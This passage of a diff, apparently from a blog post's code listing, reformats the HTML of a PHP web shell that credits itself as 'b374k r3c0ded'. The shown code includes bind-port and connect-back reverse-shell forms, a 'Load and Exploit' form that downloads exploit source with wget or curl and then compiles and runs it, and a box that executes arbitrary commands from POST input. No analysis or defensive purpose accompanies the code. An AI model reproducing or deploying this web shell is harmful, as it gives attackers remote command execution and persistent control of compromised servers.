-    } ?> &lt;table class="tabnet"&gt; &lt;tr&gt;&lt;th&gt;Port Binding&lt;/th&gt;&lt;th&gt;Connect Back&lt;/th&gt;&lt;th&gt;Load and Exploit&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;Port&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Use&lt;/td&gt;&lt;td style="text-align:justify"&gt;&lt;p&gt;&lt;select class="inputz" size="1" name="use"&gt;&lt;option value="Perl"&gt;Perl&lt;/option&gt;&lt;option value="C"&gt;C&lt;/option&gt;&lt;/select&gt; &lt;input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;IP&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Port&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Use&lt;/td&gt;&lt;td style="text-align:justify"&gt;&lt;p&gt;&lt;select size="1" class="inputz" name="use"&gt;&lt;option value="Perl"&gt;Perl&lt;/option&gt;&lt;option value="C"&gt;C&lt;/option&gt;&lt;/select&gt; &lt;input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;url&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;cmd&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&lt;select size="1" class="inputz" name="pilihan"&gt; &lt;option value="wwget"&gt;wget&lt;/option&gt; &lt;option value="wlynx"&gt;lynx&lt;/option&gt; &lt;option value="wfread"&gt;fread&lt;/option&gt; &lt;option value="wfetch"&gt;fetch&lt;/option&gt; &lt;option value="wlinks"&gt;links&lt;/option&gt; &lt;option value="wget"&gt;GET&lt;/option&gt; &lt;option value="wcurl"&gt;curl&lt;/option&gt; &lt;/select&gt;&lt;/td&gt;&lt;td colspan="2"&gt;&lt;input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div style="text-align:center;margin:2px;"&gt;<?php echo $msg; ?>&lt;/div&gt; 
+    } ?> <table class="tabnet"> <tr><th>Port Binding</th><th>Connect Back</th><th>Load and Exploit</th></tr> <tr> <td> <table> <form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> <tr><td>Port</td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"></td></tr> <tr><td>Password</td><td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"></td></tr> <tr><td>Use</td><td style="text-align:justify"><p><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select> <input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"></td></tr></form> </table> </td> <td> <table> <form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> <tr><td>IP</td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"></td></tr> <tr><td>Port</td><td><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"></td></tr> <tr><td>Use</td><td style="text-align:justify"><p><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select> <input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"></td></tr></form> </table> </td> <td> <table> <form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> <tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td></tr> <tr><td>cmd</td><td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td> </tr> <tr><td><select size="1" class="inputz" name="pilihan"> <option value="wwget">wget</option> <option value="wlynx">lynx</option> <option value="wfread">fread</option> <option value="wfetch">fetch</option> <option value="wlinks">links</option> <option value="wget">GET</option> <option value="wcurl">curl</option> </select></td><td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"></td></tr></form> </table> </td> </tr> </table> <div style="text-align:center;margin:2px;"><?php echo $msg; ?></div> 
     <?php
-} elseif (isset($_GET['x']) && ($_GET['x'] == 'shell')) { ?> &lt;form action="?y=<?php echo $pwd; ?>&x=shell" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td colspan="2"&gt; &lt;textarea class="output" readonly&gt; <?php if (isset($_POST['submitcmd'])) {
+} elseif (isset($_GET['x']) && ($_GET['x'] == 'shell')) { ?> <form action="?y=<?php echo $pwd; ?>&x=shell" method="post"> <table class="cmdbox"> <tr><td colspan="2"> <textarea class="output" readonly> <?php if (isset($_POST['submitcmd'])) {
         echo @exe($_POST['cmd']);
-    } ?> &lt;/textarea&gt; &lt;tr&gt;&lt;td colspan="2"&gt;<?php echo $prompt; ?> &lt;input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /&gt;&lt;input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:6%;" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; <?php
+    } ?> </textarea> <tr><td colspan="2"><?php echo $prompt; ?> <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:6%;" /></td></tr> </table> </form> <?php
 } else {
     if (isset($_GET['delete']) && ($_GET['delete'] != "")) {
         $file = $_GET['delete'];
@@ -1102,7 +1102,7 @@ AddHandler cgi-script .izo";
     echo $buff;
 } ?>
     
-    &lt;div class="info"&gt;:: b374k r3c0ded by &lt;span class="gaya"&gt;&lt;a href="http://facebook.com/K4C3.Undetected"&gt;<?php echo $xName; ?>&lt;/a&gt;&lt;/span&gt; ::&lt;/div&gt; 
-&lt;div class="jaya"&gt;  &copy; <?php echo date("Y", time()) . " " . $xName; ?>&lt;/div&gt; 
-&lt;/div&gt; &lt;/body&gt; &lt;/html&gt;
+    <div class="info">:: b374k r3c0ded by <span class="gaya"><a href="http://facebook.com/K4C3.Undetected"><?php echo $xName; ?></a></span> ::</div> 
+<div class="jaya">  &copy; <?php echo date("Y", time()) . " " . $xName; ?></div> 
+</div> </body> </html>
 {% endhighlight %}
